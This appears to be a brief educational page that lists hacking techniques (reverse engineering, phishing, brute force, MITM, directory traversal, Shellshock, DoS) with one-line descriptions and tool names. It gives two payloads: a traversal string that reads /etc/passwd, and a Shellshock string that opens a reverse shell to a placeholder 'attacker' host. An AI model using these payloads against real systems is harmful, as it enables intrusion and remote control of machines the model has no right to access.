Experiments: Hacking Techniques & Exploits

Reverse Engineering a Vulnerable Binary

Reverse engineering involves analyzing the executable code of a program to understand its functionality and uncover hidden vulnerabilities.
Example Tools: gdb, radare2

Phishing Attack Simulation

Phishing attacks deceive users into revealing sensitive information, such as passwords or financial details, by impersonating trustworthy entities.
Example Tool: Social-Engineer Toolkit

Brute Force Authentication Attack

Brute force attacks attempt every possible combination of passwords or keys until they find the correct one.
Example Tool: Hydra

Man-in-the-Middle (MITM) Attack

MITM attacks intercept and alter communication between two parties without their knowledge.
Example Tool: mitmproxy

Directory Traversal

Exploiting a web application's vulnerability by manipulating file paths to access sensitive files.
Exploit Example: ../../etc/passwd

Shellshock (Bash Vulnerability)

Shellshock is a vulnerability in Bash that allows attackers to inject malicious code into environment variables.
Exploit Example: '() { :;}; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1'

Denial of Service (DoS)

DoS attacks aim to make a network resource unavailable to its intended users, often through overwhelming traffic.
Example Tool: LOIC
